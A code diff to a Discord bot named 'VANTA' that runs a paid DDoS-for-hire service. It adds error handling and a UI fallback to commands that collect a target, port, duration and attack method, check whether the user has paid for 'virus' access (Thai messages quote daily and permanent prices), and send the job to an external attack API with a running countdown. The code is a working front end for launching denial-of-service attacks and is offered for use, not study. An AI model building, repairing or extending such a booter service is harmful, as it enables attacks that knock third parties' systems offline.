@@ -16,10 +16,34 @@ from config import (
     API_BASE, API_KEY, FORBIDDEN_TLDS, FORBIDDEN_IPS,
 )
 from database import Database
-from ui_v2 import (
-    build_panel, AttackModal, build_category_view,
-    build_method_view, build_running,
+
+
+# ═══════════════════════════════════════════
+# V2 Detection
+# ═══════════════════════════════════════════
+_HAS_V2 = (
+    hasattr(discord, "MessageFlags")
+    and hasattr(discord.MessageFlags, "components_v2")
 )
+
+if _HAS_V2:
+    try:
+        from ui_v2 import (
+            build_panel, AttackModal, build_category_view,
+            build_method_view, build_running,
+        )
+        _UI_MODE = "v2"
+    except Exception as e:
+        print(f"[UI] ui_v2 import failed: {e}")
+        _HAS_V2 = False
+
+if not _HAS_V2:
+    from ui_legacy import (
+        build_panel, AttackModal, build_category_view,
+        build_method_view, build_running,
+    )
+    _UI_MODE = "legacy"
+
 
 intents = discord.Intents.default()
 intents.message_content = True
@@ -28,33 +52,6 @@ intents.members = True
 bot = commands.Bot(command_prefix=PREFIX, intents=intents)
 db = Database()
 active_attacks: dict[int, dict] = {}
-
-
-# ═══════════════════════════════════════════
-# V2 Detection — รองรับ discord.py 2.5 และ 2.6+
-# ═══════════════════════════════════════════
-_HAS_V2 = (
-    hasattr(discord, "MessageFlags")
-    and hasattr(discord.MessageFlags, "components_v2")
-)
-
-
-def _send_kwargs(view, ephemeral: bool = False) -> dict:
-    """kwargs สำหรับ interaction.response.send_message / channel.send"""
-    kwargs = {"view": view}
-    if _HAS_V2:
-        kwargs["flags"] = discord.MessageFlags.components_v2
-    if ephemeral:
-        kwargs["ephemeral"] = True
-    return kwargs
-
-
-def _edit_kwargs(view) -> dict:
-    """kwargs สำหรับ edit_message"""
-    kwargs = {"view": view}
-    if _HAS_V2:
-        kwargs["flags"] = discord.MessageFlags.components_v2
-    return kwargs
 
 
 # ═══════════════════════════════════════════
@@ -116,7 +113,8 @@ async def on_ready():
     await db.init()
     print(f"[VANTA] logged in as {bot.user}")
     print(f"[VANTA] discord.py = {discord.__version__}")
-    print(f"[VANTA] Components V2 = {'yes' if _HAS_V2 else 'NO — fallback to embed'}")
+    print(f"[VANTA] UI mode = {_UI_MODE}")
+    print(f"[VANTA] active attacks = {len(active_attacks)}")
 
 
 @bot.event
@@ -134,19 +132,17 @@ async def on_command_error(ctx, error):
 
 
 # ═══════════════════════════════════════════
-# !ddos
+# Commands
 # ═══════════════════════════════════════════
 @bot.command(name="ddos", aliases=["panel"])
 async def ddos_cmd(ctx):
     try:
-        await ctx.send(**_send_kwargs(build_panel()))
-    except TypeError:
-        await ctx.send(view=build_panel())
+        await ctx.send(**build_panel())
+    except Exception as e:
+        traceback.print_exc()
+        await ctx.send(f"error: {e}")
 
 
-# ═══════════════════════════════════════════
-# !vi / !unvi
-# ═══════════════════════════════════════════
 @bot.command(name="vi")
 async def vi_cmd(ctx, member: discord.Member = None, duration: str = "TH"):
     if ctx.author.id != OWNER_ID:
@@ -184,7 +180,13 @@ async def unvi_cmd(ctx, member: discord.Member = None):
 # ═══════════════════════════════════════════
 async def open_attack_modal(interaction: discord.Interaction):
     uid = interaction.user.id
-    if not await db.has_virus(uid):
+    try:
+        has = await db.has_virus(uid)
+    except Exception as e:
+        await interaction.response.send_message(
+            f"DB error: {e}", ephemeral=True)
+        return
+    if not has:
         await interaction.response.send_message(
             "มาซื้อไวรัสมาาาา แค่วันละ 40 เอง ถาวร 300", ephemeral=True)
         return
@@ -197,7 +199,15 @@ async def open_attack_modal(interaction: discord.Interaction):
 
 async def handle_attack_submit(interaction: discord.Interaction, modal):
     uid = interaction.user.id
-    if not await db.has_virus(uid):
+
+    try:
+        has = await db.has_virus(uid)
+    except Exception as e:
+        await interaction.response.send_message(
+            f"DB error: {e}", ephemeral=True)
+        return
+
+    if not has:
         await interaction.response.send_message(
             "มาซื้อไวรัสมาาาา", ephemeral=True)
         return
@@ -218,39 +228,58 @@ async def handle_attack_submit(interaction: discord.Interaction, modal):
     if port < 1 or port > 65535 or dur < 1:
         await interaction.response.send_message("ค่าไม่ถูกต้อง", ephemeral=True)
         return
+
     if is_forbidden(target):
         await interaction.response.send_message(
             "ห้ามยิงไอ้ควายอ่านกฎด้วย", ephemeral=True)
         return
 
-    view = build_category_view(uid, target, port, dur)
     try:
-        await interaction.response.send_message(**_send_kwargs(view, ephemeral=True))
-    except TypeError:
-        await interaction.response.send_message(view=view, ephemeral=True)
+        await interaction.response.send_message(
+            ephemeral=True,
+            **build_category_view(uid, target, port, dur),
+        )
+    except Exception as e:
+        traceback.print_exc()
+        try:
+            await interaction.followup.send(f"error: {e}", ephemeral=True)
+        except Exception:
+            pass
 
 
 async def show_method_panel(interaction: discord.Interaction,
                             cat: str, target: str, port: int, dur: int):
     uid = interaction.user.id
-    view = build_method_view(cat, uid, target, port, dur)
     try:
-        await interaction.response.edit_message(**_edit_kwargs(view))
-    except TypeError:
-        await interaction.response.edit_message(view=view)
+        await interaction.response.edit_message(
+            **build_method_view(cat, uid, target, port, dur))
+    except Exception as e:
+        traceback.print_exc()
+        try:
+            await interaction.followup.send(f"error: {e}", ephemeral=True)
+        except Exception:
+            pass
 
 
 async def fire_attack(interaction: discord.Interaction, method: str,
                       target: str, port: int, dur: int):
     uid = interaction.user.id
 
-    view = build_running(method, target, port, dur, dur, "...")
     try:
-        await interaction.response.edit_message(**_edit_kwargs(view))
-    except TypeError:
-        await interaction.response.edit_message(view=view)
+        await interaction.response.edit_message(
+            **build_running(method, target, port, dur, dur, "..."))
+    except Exception as e:
+        traceback.print_exc()
+        try:
+            await interaction.followup.send(f"error: {e}", ephemeral=True)
+        except Exception:
+            pass
+        return
 
-    msg = await interaction.original_response()
+    try:
+        msg = await interaction.original_response()
+    except Exception:
+        msg = None
 
     url = f"{API_BASE}/attack?key={API_KEY}"
     payload = {"method": method, "target": target, "port": port, "duration": dur}
@@ -261,42 +290,47 @@ async def fire_attack(interaction: discord.Interaction, method: str,
                               timeout=aiohttp.ClientTimeout(total=30)) as r:
                 data = await r.json()
     except Exception as e:
-        await _safe_edit(msg, build_running(method, target, port, 0, dur, f"error: {e}"))
+        if msg:
+            await _safe_edit(msg, build_running(method, target, port, 0, dur, f"error: {e}"))
         return
 
     if not data.get("success"):
         detail = data.get("detail", "fail")
-        await _safe_edit(msg, build_running(method, target, port, 0, dur, f"API: {detail}"))
+        if msg:
+            await _safe_edit(msg, build_running(method, target, port, 0, dur, f"API: {detail}"))
         return
 
-    await db.log_attack(uid, target, port, method, dur)
+    try:
+        await db.log_attack(uid, target, port, method, dur)
+    except Exception:
+        pass
+
     state = {"job_id": data.get("job_id"), "msg": msg, "start": time.time()}
     active_attacks[uid] = state
     asyncio.create_task(_tick(uid, state, method, target, port, dur))
 
 
-async def _safe_edit(msg, view):
-    """แก้ข้อความ — fallback ถ้า V2 ไม่รองรับ"""
+async def _safe_edit(msg, kwargs: dict):
     try:
-        await msg.edit(**_edit_kwargs(view))
+        await msg.edit(**kwargs)
         return
     except Exception:
         pass
     try:
-        await msg.edit(view=view)
+        await msg.edit(view=None)
     except Exception:
         pass
 
 
 async def _tick(uid, state, method, target, port, dur):
-    msg = state["msg"]
+    msg = state.get("msg")
     st = state["start"]
     while time.time() - st < dur:
         await asyncio.sleep(1)
         left = max(0, int(dur - (time.time() - st)))
-        await _safe_edit(msg, build_running(method, target, port, left, dur, "running"))
+        if msg:
+            await _safe_edit(msg, build_running(method, target, port, left, dur, "running"))
 
-    # kill job ที่ API
     try:
         async with aiohttp.ClientSession() as s:
             await s.post(
@@ -307,14 +341,15 @@ async def _tick(uid, state, method, target, port, dur):
         pass
 
     active_attacks.pop(uid, None)
-    await _safe_edit(msg, build_running(method, target, port, 0, dur, "finished"))
+    if msg:
+        await _safe_edit(msg, build_running(method, target, port, 0, dur, "finished"))
 
 
 # ═══════════════════════════════════════════
-# Signal handler
+# Signal
 # ═══════════════════════════════════════════
 def _shutdown(sig, frame):
-    print(f"\n[VANTA] signal {sig} received — shutting down")
+    print(f"\n[VANTA] signal {sig} — shutting down")
     raise SystemExit(0)
 
 
